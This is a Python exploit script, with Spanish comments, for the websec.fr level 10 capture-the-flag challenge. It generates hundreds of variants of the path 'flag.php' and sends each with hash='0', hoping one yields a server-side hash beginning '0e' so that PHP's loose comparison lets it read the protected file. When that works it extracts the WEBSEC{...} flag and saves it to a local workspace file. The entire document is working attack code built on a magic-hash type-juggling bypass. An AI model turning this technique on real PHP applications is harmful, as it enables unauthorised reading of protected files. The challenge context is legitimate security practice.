#!/usr/bin/env python3
import requests
import time
import itertools
import string

url = "https://websec.fr/level10/index.php"

# Generar MUCHAS variaciones de paths para flag.php
paths = set()

# Variaciones básicas
for prefix in ["", ".", "./", "../", "///", "////", ".//", "././", "./././"]:
    for suffix in ["", "/", "//", "///"]:
        paths.add(f"{prefix}flag.php{suffix}")

# Con caracteres antes/después
for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.-":
    paths.add(f"{c}flag.php")
    paths.add(f"flag.php{c}")
    paths.add(f"{c}{c}flag.php")
    paths.add(f"flag.php{c}{c}")

# Con dos caracteres
common = "abcdefghijklmnopqrstuvwxyz0123456789._-/"
for c1, c2 in itertools.product(common[:20], repeat=2):  # Limitado para no tardar mucho
    paths.add(f"{c1}{c2}flag.php")

paths = list(paths)
print(f"Probando {len(paths)} variaciones de paths con hash='0'...")
print("Buscando si alguno genera hash 0e... en el servidor\n")

for i, path in enumerate(paths):
    if i % 50 == 0:
        print(f"Progreso: {i}/{len(paths)} - Probando: {repr(path[:30])}")
    
    try:
        r = requests.get(url, params={"f": path, "hash": "0"}, timeout=5)
        
        # Si NO dice "Permission denied", puede ser que funcionó!
        if "Permission denied" not in r.text:
            print(f"\n¡Respuesta diferente para path: {repr(path)}!")
            
            if "WEBSEC{" in r.text:
                flag_start = r.text.find("WEBSEC{")
                flag_end = r.text.find("}", flag_start)
                if flag_end > flag_start:
                    flag = r.text[flag_start:flag_end+1]
                    print(f"\n{'='*60}")
                    print(f"¡¡¡FLAG ENCONTRADA!!!")
                    print(f"{'='*60}")
                    print(f"FLAG: {flag}")
                    print(f"Path: {path}")
                    print(f"Hash: 0")
                    
                    with open("/workspace/websec_level10/FLAG.txt", "w") as f:
                        f.write(f"FLAG: {flag}\nPath: {path}\nHash: 0\n")
                    
                    exit(0)
            else:
                print(f"  Tamaño respuesta: {len(r.text)} bytes")
                if len(r.text) > 2000:
                    print(f"  Parece que mostró código!")
                    # Guardar para inspección
                    with open(f"/workspace/websec_level10/interesting_{i}.html", "w") as f:
                        f.write(r.text)
    
    except Exception as e:
        continue
    
    time.sleep(0.03)  # Rate limiting

print(f"\n{'='*60}")
print("Búsqueda completada")
print(f"{'='*60}")